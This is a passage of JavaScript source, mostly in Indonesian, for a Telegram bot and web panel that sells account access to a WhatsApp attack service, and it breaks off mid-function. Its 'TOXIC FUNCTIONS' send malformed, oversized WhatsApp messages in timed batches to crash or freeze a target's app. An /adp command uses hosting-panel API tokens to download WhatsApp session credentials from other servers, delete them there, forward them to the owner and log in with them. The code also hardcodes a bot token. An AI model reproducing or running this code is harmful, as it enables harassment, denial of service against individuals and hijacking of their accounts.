    if (!messageContent) {
        return ctx.reply(
            "⚠️ *Format Broadcast Salah!*\n\nGunakan: `/addpesan <Isi Pesan>`\nContoh: `/addpesan Halo member, ada update baru!`", 
            { parse_mode: 'Markdown' }
        );
    }

    // 3. Ambil Database User
    const users = getUsers();
    if (users.length === 0) {
        return ctx.reply("❌ Database user kosong. Belum ada akun yang dibuat.");
    }

    // 4. Loop ke SEMUA User untuk kirim pesan
    let successCount = 0;
    const timestamp = Date.now();
    const senderName = ctx.from.first_name || "Admin";

    users.forEach((user, index) => {
        // Kita buat ID unik untuk setiap pesan (Waktu + Index agar tidak duplikat)
        const msgId = `${timestamp}_${index}`; 
        
        globalMessages.push({
            id: msgId,
            to: user.username,  // <-- Kuncinya disini: Dikirim ke username user saat ini dalam loop
            from_id: userId,    // ID Telegram Pengirim
            sender_name: senderName,
            content: messageContent,
            timestamp: timestamp,
            read: false,
            replied: false
        });

        successCount++;
    });

    // 5. Laporan ke Admin
    ctx.reply(
        `✅ *BROADCAST SUKSES*\n\n` +
        `📦 Pesan: _${messageContent}_\n` +
        `👥 Penerima: *${successCount}* User\n` +
        `📅 Waktu: ${new Date().toLocaleString()}`, 
        { parse_mode: 'Markdown' }
    );
});

bot.command("listakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers(); 

  // Validasi Akses Owner
  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
  }

  if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

  let teks = `<blockquote>☘️ All Account Apps SilentKiller</blockquote>\n\n`;

  users.forEach((u, i) => {
    // 1. Ambil Role (Safe Check)
    const userRole = u.role ? u.role.toLowerCase() : "user";
    let roleDisplay = "USER";
    let roleIcon = "👤";

    // Mapping Role
    switch (userRole) {
      case "owner": case "creator":
        roleDisplay = "OWNER"; roleIcon = "👑"; break;
      case "admin":
        roleDisplay = "ADMIN"; roleIcon = "👮"; break;
      case "resseller": case "ressell":
        roleDisplay = "RESSELLER"; roleIcon = "💼"; break;
      case "moderator": case "mod":
        roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
      case "vip":
        roleDisplay = "VIP MEMBER"; roleIcon = "💎"; break;
      case "pt":
        roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
      default:
        roleDisplay = "USER"; roleIcon = "👤"; break;
    }

    // 2. LOGIKA SENSOR PASSWORD (PERBAIKAN ERROR DISINI)
    // Kita pastikan 'u.key' ada isinya. Jika kosong, pakai string kosong.
    const rawKey = u.key ? u.key.toString() : "???"; 
    
    let maskedKey = "";
    if (rawKey === "???") {
        maskedKey = "-(Rusak/No Key)-";
    } else if (rawKey.length <= 5) {
      // Jika pendek, sensor semua
      maskedKey = "•".repeat(rawKey.length);
    } else {
      // Jika panjang, sensor tengah
      const start = rawKey.slice(0, 2);
      const end = rawKey.slice(-2);
      maskedKey = `${start}•••••${end}`;
    }

    // 3. Format Tanggal
    // Tambahkan cek juga takutnya expired undefined
    const expTime = u.expired || Date.now(); 
    const exp = new Date(expTime).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit", 
      hour: "2-digit", minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    // 4. Susun Pesan
    teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
    teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
    teks += `   ⌛ Exp: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("delakun", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});


// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("adp", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⣦⣤⣾⣿⠿⠛⣋⣥⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⡤⡀⢈⢻⣬⣿⠟⢁⣤⣶⣿⣿⡿⠿⠿⠛⠛⢀⣄⠀
⠀⠀⢢⣘⣿⣿⣶⣿⣯⣤⣾⣿⣿⣿⠟⠁⠄⠀⣾⡇⣼⢻⣿⣾
⣰⠞⠛⢉⣩⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣧⣤⣴⠟⣠⣿⢰⣿⣿
⣶⡾⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣈⣩⣤⡶⠟⢛⣩⣴⣿⣿⡟
⣠⣄⠈⠀⣰⡦⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠛⠛⠁
⣉⠛⠛⠛⣁⡔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠥⠀⠀
⣭⣏⣭⣭⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢠⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─⦏ Welcome Back ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @thezeyyn
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "MainFile", "mbut.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca mbut.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "MainFile", "mbut.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file mbut.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
    const { username, key } = req.body;
    const users = getUsers();

    // Validasi Login
    const user = users.find(u => u.username === username && u.key === key);

    if (!user) {
        return res.redirect("/login?msg=Username/Password Salah");
    }

    // Buat Cookie (Tiket Masuk) - Tahan 24 Jam
    res.cookie("sessionUser", user.username, { 
        maxAge: 86400000, // 24 jam
        httpOnly: true 
    });

    // Masuk ke Execution
    res.redirect("/execution");
});

      
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", (req, res) => {
    // --- DEBUG LOGGING (Supaya tau kenapa mental) ---
    console.log("Hii, Welcome");
    console.log("🔍 [DEBUG LOGIN] Mengakses /execution...");
    
    // 1. Cek apakah Cookie Parser jalan
    if (!req.cookies) {
        console.log("❌ ERROR: req.cookies undefined. Pastikan app.use(cookieParser()) dipasang di index.js!");
        return res.redirect('/login');
    }

    const username = req.cookies.sessionUser;
    console.log("👤 Username dari Cookie:", username || "KOSONG/UNDEFINED");

    // 2. Load Database
    const users = getUsers();
    console.log(`📂 Total User di Database: ${users.length}`);

    // 3. Cari User
    // Kita gunakan .trim() untuk jaga-jaga ada spasi
    const currentUser = users.find(u => u.username === username);

    if (currentUser) {
        console.log("✅ User Ditemukan:", currentUser.username);
        console.log("🔑 Role:", currentUser.role);
    } else {
        console.log("⛔ User TIDAK Ditemukan di Database. Redirecting ke Login...");
        // INI PENYEBAB MENTALNYA
        return res.redirect('/login');
    }
    console.log("==========================================");

    // ============================================================
    // [BAGIAN A] LOGIC EKSEKUSI SERANGAN
    // ============================================================
    const targetNumber = req.query.target;
    const mode = req.query.mode;

    if (targetNumber || mode) {
        // ... (Logic Maintenance & Validasi Input) ...
        if (sessions.size === 0) {
            return res.send(executionPage("🚧 MAINTENANCE SERVER !!", { message: "Tunggu maintenance selesai..." }, false, currentUser, currentUser.key, mode));
        }

        if (!targetNumber) {
            return res.send(executionPage("✓ Server ON", { message: "Masukkan nomor & mode." }, true, currentUser, currentUser.key, mode || ""));
        }
        
        // Cek Cooldown
        const now = Date.now();
        const cooldown = 3 * 60 * 1000; 
        if (typeof lastExecution !== 'undefined' && (now - lastExecution < cooldown)) {
             const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
             return res.send(executionPage("⏳ SERVER COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, ""));
        }

        const target = `${targetNumber}@s.whatsapp.net`;

        try {
            if (mode === "uisystem") Crashandroid(24, target);
            else if (mode === "invis") DelayBapakLo (24, target);
            else if (mode === "fc") Forclose(24, target);
            else if (mode === "ulti") BomBug(24, target);
            else if (mode === "zeyy") StuckHome(24, target);
            else throw new Error("Mode tidak dikenal.");

            lastExecution = now;
            console.log(`[SUCCESS] Attack sent to ${targetNumber}`);
            
            return res.send(executionPage("✓ S U C C E S", {
                target: targetNumber,
                timestamp: new Date().toLocaleString("id-ID"),
                message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
            }, false, currentUser, currentUser.key, mode));

        } catch (err) {
            console.error(err);
            return res.send(executionPage("✗ Gagal", { target: targetNumber, message: "Error Server" }, false, currentUser, currentUser.key, mode));
        }
        return; 
    }

    // ============================================================
    // [BAGIAN B] LOGIC DASHBOARD (HTML + ROLE)
    // ============================================================
    
    // Pastikan path ini benar sesuai folder kamu
    const filePath = "./MainFile/Pusat.html"; 

    fs.readFile(filePath, "utf8", (err, html) => {
        if (err) {
            console.error("❌ Gagal baca file HTML:", err);
            return res.status(500).send("Error loading HTML file");
        }

        // --- 1. LOGIC WARNA ROLE ---
        const rawRole = (currentUser.role || 'user').toLowerCase();
        let roleHtml = "";

        switch (rawRole) {
            case "owner": case "creator":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
            case "admin":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
            case "reseller": case "ress":
                roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;"> Reseller</span>'; break;
            case "pt":
                roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
            case "vip":
                roleHtml = '<span style="color: #FFFFFF;>VIP</span>'; break;
            case "moderator":
                roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
            default:
                roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
        }

        // --- 2. LOGIC WAKTU ---
        const timeIso = currentUser.expired ? new Date(currentUser.expired).toISOString() : new Date().toISOString();

        // --- 3. REPLACE HTML ---
        // Ganti Username
        html = html.replace(/\${username}/g, currentUser.username);
        // Ganti Role
        html = html.replace(/\${displayRole}/g, roleHtml);
        // Ganti Waktu
        html = html.replace(/\${formattedTime}/g, timeIso);
        // Add Ini
        html = html.replace(/\${rawRole}/g, rawRole);
        // --- 4. KIRIM ---
        res.send(html);
    });
});
      

app.post('/api/create-account', (req, res) => {
    const { username, customKey, duration, role } = req.body;
    const adminUsername = req.cookies.sessionUser;

    if (!adminUsername) return res.json({ success: false, message: "Sesi Habis, Login Ulang!" });

    const users = getUsers();
    const adminUser = users.find(u => u.username === adminUsername);
    
    if (!adminUser) return res.json({ success: false, message: "Admin tidak ditemukan!" });

    // --- 1. VALIDASI HAK AKSES ---
    const adminRole = (adminUser.role || 'user').toLowerCase();
    const targetRole = role.toLowerCase();
    let allowed = false;

    if (adminRole === 'owner' || adminRole === 'creator') allowed = true;
    else if (adminRole === 'admin' && ['member', 'user', 'reseller', 'pt', 'admin'].includes(targetRole)) allowed = true;
    else if (adminRole === 'pt' && ['member', 'user', 'reseller', 'pt'].includes(targetRole)) allowed = true;
    else if ((adminRole === 'reseller' || adminRole === 'moderator') && ['member', 'user', 'reseller'].includes(targetRole)) allowed = true;

    if (!allowed) return res.json({ success: false, message: `Role ${adminRole} tidak boleh membuat ${targetRole}!` });

    // --- 2. VALIDASI DATA ---
    if (users.find(u => u.username === username)) return res.json({ success: false, message: "Username sudah ada!" });

    // Parse Durasi
    let ms = 30 * 24 * 60 * 60 * 1000;
    if (duration.endsWith('d')) ms = parseInt(duration) * 24 * 60 * 60 * 1000;
    else if (duration.endsWith('h')) ms = parseInt(duration) * 60 * 60 * 1000;

    const finalKey = customKey || generateKey(4); 
    const expired = Date.now() + ms;

    // --- 3. SIMPAN ---
    users.push({ username, key: finalKey, expired, role: targetRole });
    saveUsers(users);

    // 🔥 LOG KEREN DI PANEL PTERODACTYL 🔥
    console.log(`\n================================`);
    console.log(`[+] NEW ACCOUNT CREATED (WEB)`);
    console.log(` ├─ Creator : ${adminUsername} (${adminRole})`);
    console.log(` ├─ New User: ${username}`);
    console.log(` ├─ Role    : ${targetRole.toUpperCase()}`);
    console.log(` └─ Expired : ${new Date(expired).toLocaleString()}`);
    console.log(`================================\n`);

    return res.json({ success: true, message: "Berhasil" });
});


app.get('/api/list-accounts', (req, res) => {
    // Cek Login
    if (!req.cookies.sessionUser) return res.json([]);

    const users = getUsers();
    
    // Kirim data user TAPI JANGAN KIRIM PASSWORD/KEY (Privacy)
    // Urutkan dari yang terbaru dibuat (paling bawah di array = paling baru)
    const safeList = users.map(u => ({
        username: u.username,
        role: u.role || 'user',
        expired: u.expired
    })).reverse(); 

    res.json(safeList);
});


// --- API: REPLY MESSAGE (Web -> Telegram ID 8312382874) ---
app.post('/api/reply-message', async (req, res) => {
    const { msgId, replyText } = req.body;
    const username = req.cookies.sessionUser;

    if (!username) return res.json({ success: false, message: "Login dulu!" });

    // Cari pesan di database memori
    const msgIndex = globalMessages.findIndex(m => m.id === msgId);
    
    if (msgIndex === -1) return res.json({ success: false, message: "Pesan tidak ditemukan / sudah dihapus." });

    const msg = globalMessages[msgIndex];
    
    if (msg.replied) return res.json({ success: false, message: "Anda sudah membalas pesan ini." });

    // --- SETTING PENGIRIMAN ---
    const adminChatId = "8312382874"; // <--- TARGET ID KHUSUS
    const botToken = "8347430768:AAF3sNnMl2wdJ2MOqoHPhW-OFoCPUJ16GzE"; // Token Bot Anda

    const textToSend = `📩 *BALASAN DARI WEB*\n\n👤 User: \`${username}\`\n💬 Pesan Awal: _${msg.content}_\n\n↩️ *Balasan User:* \n${replyText}`;

    try {
        // Request ke API Telegram
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: textToSend,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            // Tandai pesan sudah dibalas
            globalMessages[msgIndex].replied = true;
            
            return res.json({ success: true });
        } else {
            console.error("Telegram API Error:", data);
            return res.json({ success: false, message: "Gagal kirim ke Telegram" });
        }
    } catch (e) {
        console.error("Reply Error:", e);
        return res.json({ success: false, message: "Server Error saat mengirim balasan." });
    }
});


// --- API: LOGOUT (Ganti yang lama dengan ini) ---
app.post('/api/logout', (req, res) => {
    const { reason } = req.body;
    const username = req.cookies.sessionUser || "Unknown";
    
    console.log(`[LOGOUT] User: ${username} | Alasan: ${reason}`);

    // Hapus Cookie
    res.clearCookie('sessionUser');
    res.clearCookie('sessionKey');
    
    return res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(chalk.red(`Server Online Enjoy Freind`));
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== TOXIC FUNCTIONS ==================== //
async function frezeui(sock, X) {
  await sock.relayMessage(X, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(7000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/vibracoess",
                    unconsentedUsersUrl: "https://t.me/vibracoess",
                    consentedUsersUrl: "https://t.me/vibracoess",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "🦠",
                  format: "EXTENSIONS_1"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {});
}
async function XNecroInvite(X) {
  await sock.relayMessage(
    X,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "12345678@g.us",
            inviteCode: "XxX",
            inviteExpiration: "9999",
            groupName: "ោ៝".repeat(9900),
            caption: "ꦾ".repeat(8900),
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 100 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
        },
      },
    },
    {
     participant: { jid: X }, 
    }
  );
}
async function StickerSplit(sock, X) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: X,
            mentionedJid: [
              X,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: X,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(X, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: X }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
  }
}


async function Crashandroid(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
        XNecroInvite(X),
        XNecroInvite(X),
        XNecroInvite(X),
        await sleep(1000)
           ]);
        console.log(chalk.green(`

❄️Succes Send Bug Yang Ke ${count + 1}
  `));
        count++;
        setTimeout(sendNext, 4000);
      } else {
        console.log(chalk.red(`🥶 Succesfull Send All Bug, Hati-hati Apknya Gacor`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function DelayBapakLo(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        await sleep(2000),
        
            await sleep(4000)
        ]);
        console.log(chalk.red(`

❄️ Berhasil Send Bug Yang Ke ${count + 1}/10, Terlalu dingin Abangku
  `));
        count++;
        setTimeout(sendNext, 90000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function Forclose(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 18) {
        await Promise.all([
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        await sleep(3000),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        await sleep(9000),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        StickerSplit(sock, X),
        await sleep(3000),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
        ForcloseClickFomo(sock, X),
